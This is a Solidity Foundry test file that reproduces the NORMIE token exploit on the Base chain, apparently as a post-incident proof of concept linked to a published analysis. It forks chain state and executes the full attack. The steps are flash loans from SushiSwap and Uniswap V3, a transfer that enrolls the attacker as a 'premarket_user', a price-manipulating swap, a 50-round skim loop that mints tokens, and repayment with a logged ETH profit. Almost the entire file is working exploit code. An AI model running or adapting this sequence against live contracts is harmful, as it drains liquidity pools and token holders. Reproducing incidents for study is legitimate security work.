// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

import {
    IUniswapV2Callee,
    IUniswapV3FlashCallback,
    IUniswapV2Router02,
    IUniswapV2Pair,
    IUniswapV3Pool
} from "./utils/Interfaces.sol";

/**
 * Incident Write-up: https://www.certik.com/resources/blog/normie-incident-analysis
 * Chain: Base
 * Attack Tx : https://app.blocksec.com/explorer/tx/base/0xa618933a0e0ffd0b9f4f0835cc94e523d0941032821692c01aa96cd6f80fc3fd
 */
interface Normie {}

contract NormieExploit is Test, IUniswapV2Callee, IUniswapV3FlashCallback {
    address SushiRouterv2 = 0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891;

    address SLP = 0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f;

    address UniswapV3Pool = 0x67ab0E84C7f9e399a67037F94a08e5C664DC1C66;

    address WETH = 0x4200000000000000000000000000000000000006;

    address NORMIE = 0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200;

    address teamWallet = 0xd8056B0F8AA2126a8DB6f0B3109Fe9127617bEb2;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), 14952783 - 1);

        payable(address(0)).call{value: address(this).balance}("");

        deal(address(this), 3 ether);
    }

    function testExploit() public {
        console2.log("NORMIE.balanceOf(teamWallet) = ", IERC20(NORMIE).balanceOf(teamWallet)); // 5 million NORMIE TOKENS

        // 1. Swap 2 WETH tokens to NORMIE tokens on Sushiswap
        // Additional NORMIE tokens needed for the flashloan/transfer fees
        address[] memory path1 = new address[](2);
        path1[0] = WETH;
        path1[1] = NORMIE;

        IUniswapV2Router02(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0, path1, address(this), block.timestamp + 300
        );

        // 2. Flashloan 5 million NORMIE tokens (same amount as the team wallet) from SushiV2 Pair and pay them back
        // in order to maliciously register the attack account as a "premarket_user" in the NORMIE token contract
        IUniswapV2Pair(SLP).swap(
            0,
            5_000_000 * 10 ** IERC20(NORMIE).decimals(),
            address(this),
            hex"01"
        );

        console2.log("NORMIE amount after swap =", IERC20(NORMIE).balanceOf(address(this)));

        console2.log("ETH balance before exploit =", address(this).balance);
        uint256 balanceBefore = address(this).balance;

        // 4. Flashloan 11 million NORMIE tokens from Uniswap V3 Pool and use them further in the exploit
        IUniswapV3Pool(UniswapV3Pool).flash(address(this), 0, 11_333_141_501_283_594, hex"");
        
        console2.log("ETH balance after exploit =", address(this).balance);
        console2.log("Profit = ", (address(this).balance - balanceBefore) / 1 ether, "ether, original =", address(this).balance - balanceBefore);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external override {
        // 3. Repay the flashloan by directly transferring 5 million NORMIE tokens to SushiV2 Pair
        uint256 normieAmount = IERC20(NORMIE).balanceOf(address(this));

        console2.log("NORMIE amount after flashloan from Sushiswap V2 = ", normieAmount);

        // Side-effect: added the attacker account to `premarket_user` mapping, useful later in the exploit
        IERC20(NORMIE).transfer(address(SLP), normieAmount);
    }

    /**
     * Exploit summary: The attacker flashloans a large amount of NORMIE tokens, sells most of it for ETH and then
     * uses the fact that the attacker account is now a `premarket_user` to inflate the NORMIE token supply and increase
     * his balance.
     * The freshly minted NORMIE tokens are then skimmed by the attacker, who then proceeds to pay back the flashloan.
     */
    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external override {
        // 5. Approve the SushiV2 Pair to spend the NORMIE tokens
        IERC20(NORMIE).approve(SushiRouterv2, type(uint256).max);

        // 6. Swap 80% of the loaned NORMIE tokens to WETH on Sushiswap, to manipulate the price
        // Note: This is where most of the profit is made
        console2.log("ETH balance before swap =", address(this).balance / 1 ether);

        address[] memory path2 = new address[](2);
        path2[0] = NORMIE;
        path2[1] = WETH;
        IUniswapV2Router02(SushiRouterv2).swapExactTokensForETHSupportingFeeOnTransferTokens(
            9_066_513_201_026_875, 0, path2, address(this), block.timestamp + 300
        );
        
        console2.log("ETH balance after swap =", address(this).balance / 1 ether);

        // 7. Looping transfer to NORMIE token contract and skim for 50 times
        // Note: Increase the balance of NORMIE tokens for the attacker to enable the attacker to pay it back later
        uint256 normieAmountAfterSwap = IERC20(NORMIE).balanceOf(address(this));
        IERC20(NORMIE).transfer(SLP, normieAmountAfterSwap);
        for (uint256 i; i < 50; ++i) {
            IUniswapV2Pair(SLP).skim(address(this));
            // Note: New NORMIE tokens are minted to the contract each time to be skimmed by the attacker later
            IERC20(NORMIE).transfer(SLP, normieAmountAfterSwap);
        }

        // 8. Skim the remaining NORMIE tokens
        IUniswapV2Pair(SLP).skim(address(this));

        // 9. Swap some ETH to NORMIE tokens on Sushiswap in order to payback the NORMIE tokens to Uniswap V3 Pool
        // Note: The price of NORMIE tokens is already manipulated by the attacker, which makes it very cheap
        address[] memory path1 = new address[](2);

        path1[0] = WETH;
        path1[1] = NORMIE;

        IUniswapV2Router02(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0, path1, address(this), block.timestamp
        );

        // 9. Payback the NORMIE tokens to Uniswap V3 Pool
        IERC20(NORMIE).transfer(UniswapV3Pool, 11_446_472_916_296_430);
    }

    receive() external payable {}
}
